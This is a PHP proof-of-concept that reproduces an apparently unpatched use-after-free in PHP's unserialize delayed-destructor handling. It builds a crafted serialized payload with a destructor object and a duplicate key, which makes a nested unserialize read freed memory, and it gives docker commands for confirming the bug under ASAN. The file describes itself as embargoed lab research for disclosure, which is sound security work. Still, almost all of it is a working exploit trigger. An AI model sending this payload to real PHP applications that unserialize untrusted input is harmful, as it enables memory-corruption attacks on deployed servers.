<?php
/**
 * var_destroy delayed-destructor re-entry UAF — minimal reproducer.
 *
 * A `__destruct` that calls unserialize() runs while `var_destroy()` is
 * walking the delayed-destructor list. That walk does not hold
 * `BG(serialize_lock)`, so the nested unserialize() takes the stale
 * `BG(unserialize).data` branch and reads the `var_entries` extension chunk
 * that `var_destroy()` just freed.
 *
 * Affected: the CVE-2026-109618/109619 patch does NOT fix this. Confirmed
 * under ASAN on 8.2.34, 8.4.27 and 8.5.12 (var_unserializer.c:906).
 *
 * Run (ASAN evidence):
 *   docker run --rm -v "$PWD/poc:/work/poc" php-asan-8427:local \
 *       php /work/poc/verify_var_destroy_uaf.php
 *
 * Run (production ZendMM — silent read, no crash):
 *   docker run --rm --entrypoint php -v "$PWD/poc:/work/poc" \
 *       php:8.4.27-apache /work/poc/verify_var_destroy_uaf.php
 *
 * argv[1] = integer entries before the object (default 1016; total serialized
 * elements 1018 is the measured threshold: it allocates the var_entries
 * extension chunk that var_destroy() frees).
 *
 * Scope: lab-only, memory-safety research. EMBARGOED until the PHP project is
 * engaged (see docs/VAR_DESTROY_UAF.md).
 */
$N = (int)($argv[1] ?? 1016);

class T {
    public function __destruct() {
        // Any nested unserialize reaches php_var_unserialize's read of the
        // freed (*var_hash)->last->used_slots.
        @unserialize('i:0;');
        fwrite(STDERR, "  [destruct] nested unserialize returned\n");
    }
}

$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= 'i:0;N;';
}
$payload .= 'i:99999;O:1:"T":0:{}';   // delayed-destructor object
$payload .= 'i:99999;i:42;';          // duplicate key moves it to the dtor list
$payload .= '}';

fwrite(STDERR, "payload: {$N} entries + dtor object, " . strlen($payload) . " bytes\n");
@unserialize($payload);
fwrite(STDERR, "done (on production ZendMM this is silent; ASAN reports the UAF)\n");
